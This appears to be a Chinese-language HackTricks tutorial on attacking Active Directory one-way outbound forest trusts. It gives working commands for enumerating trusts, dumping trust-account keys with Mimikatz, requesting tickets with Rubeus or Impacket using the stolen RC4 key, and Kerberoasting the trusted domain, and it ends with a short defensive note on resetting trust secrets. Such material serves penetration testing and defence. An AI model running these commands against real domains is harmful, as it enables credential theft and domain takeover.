# 外部 Forest Domain - 单向（Outbound）

{{#include ../../banners/hacktricks-training.md}}

在这种情况下，**你的域** 正在向来自 **不同 domain/forest** 的 principals **信任** 某些 **privileges**。

## 枚举

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
如果你有可用的 AD module，也直接检查 **Trusted Domain Object (TDO)**。这会给你原始的、由 LDAP 支持的 trust 数据，之后在决定走更简单的路径是 **FSP/group abuse** 还是 **trust-account abuse** 时会用到：
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
你还应该列举 `CN=ForeignSecurityPrincipals` 中的 foreign principals 实际被授予了哪里访问权限。常见的收获点包括：

- 当前域中的某台服务器/DC 上的 **Local admin**
- 某个具有用户/计算机/GPO ACL 的 **custom domain group** 的成员
- 修改 **computer objects** 的权限，如果 trust 配置允许，之后可能演变为 [RBCD](resource-based-constrained-delegation.md)

## Trust Account Attack

当从 domain/forest **B** 到 domain/forest **A** 创建单向 trust 时（**B trusts A**），会在 **A** 中为 **B** 创建一个 **trust account**。从 **A** 的 outbound-trust 视角来看，这很有用，因为如果你之后 compromise 了 **B**（trusting 侧），你可以在那里 dump 该 trust secret，并以 `B$` 的身份重新对 **A** 进行认证。

这里需要理解的关键点是，这个 trust account 的 password 和 Kerberos material 可以使用以下方式从 **trusting** 域中的 Domain Controller 中提取：
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
这之所以有效，是因为在 **trusted** 域中创建的 trust account 是一个已启用的 principal，最终会获得那里普通域用户的基础权限。这通常足以开始枚举 LDAP、请求 tickets，并找到下一个提权路径。

在一个场景中，`ext.local` 是 **trusting** 域，而 `root.local` 是 **trusted** 域，名为 `EXT$` 的用户账号会在 `root.local` 内创建。转储 `ext.local` 中的 trust keys 会泄露可作为 `root.local\EXT$` 用于访问 `root.local` 的凭据：
```bash
lsadump::trust /patch
```
接下来，使用提取的 **RC4** key 作为 `root.local\EXT$` 在 `root.local` 中进行身份验证：
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
然后以该主体枚举受信任域，例如通过 Kerberoasting `root.local` 中的高价值 SPN：
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### 从 Linux

如果你恢复了 **RC4** trust-account key，那么同样的思路也可以在 Linux 上使用 Impacket：
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
如果 **RC4** 不可用，就回退到恢复出的 **cleartext password**（或派生出的 **AES** keys），并从该 foothold 重新使用常规的 [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) 和 [Kerberoast](kerberoast.md) 工作流。

### Key material gotchas

不要把 **trust keys** 和 **trust-account credentials** 混淆：

- 在单向信任中，双方都存有一个 **TDO**，但真正的 **`EXT$` user account 只存在于 trusted domain 中**。
- 当前 trust-account password 体现在 TDO trust secret（`NewPassword` / current trust key）里。
- **RC4** trust key 是最容易复用为 `asktgt` 的 trust account 工件；在默认配置中，这通常是可用的 enctype，因为 trust account 往往是空的 `msDS-SupportedEncryptionTypes`。
- 如果你从 **AES trust keys** 的角度考虑，请记住它们不能与 trust-account AES keys 互换，因为 salts 不同。

所以，对于本页的 technique，优先使用提取出的 **RC4** material 或恢复出的 **cleartext** password。

### Gathering cleartext trust password

在前面的流程里，使用的是 trust hash 而不是 **cleartext password**（它也会被 **mimikatz** dump 出来）。

可以通过将 mimikatz 的 \[ CLEAR ] 输出从 hexadecimal 转换并去除空字节 `\x00` 来获得 cleartext password：

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

有时在创建 trust relationship 时，用户必须为该 trust 输入一个 password。在这个演示中，key 是原始 trust password，因此可以直接读取。随着 key 轮换（默认：每 30 天一次），cleartext 通常会不再可读，但在技术上仍然可用。

cleartext password 可用于以 trust account 身份执行常规 authentication，作为使用 trust account 的 Kerberos secret key 请求 TGT 的替代方案。这里，从 `ext.local` 查询 `root.local` 中 `Domain Admins` 的成员：

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts 是比较别扭的 principals。像 **RUNAS / console / RDP** 这样的交互式 logons 不是这里的预期路径，而且 **NTLM** authentication 尝试可能会以 `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT` 失败。应优先考虑 **Kerberos network logons**（`asktgt`, LDAP, CIFS, Kerberoast）。

### Persistence / cleanup note

如果防御方意识到 trusting domain 已被 compromise，应使用 `netdom trust ... /resetOneSide ...` 在 **两侧** 轮换 trust secret。从 operator 角度看，这很重要，因为 **manual reset 会立即使旧的 trust material 失效**，而正常的 trust-password 轮换会在切换期间保留 current/previous 值。
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## References

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
